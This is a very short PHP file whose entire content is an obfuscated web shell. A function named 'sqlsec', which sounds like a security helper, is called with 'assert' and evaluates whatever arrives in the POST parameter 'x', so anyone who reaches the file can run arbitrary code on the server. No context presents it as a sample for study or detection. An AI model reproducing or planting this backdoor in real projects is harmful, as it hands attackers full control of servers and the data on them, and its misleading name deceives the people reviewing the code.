<?php 
    function sqlsec($a){
        $a($_POST['x']);
    }

    sqlsec(assert);
?>
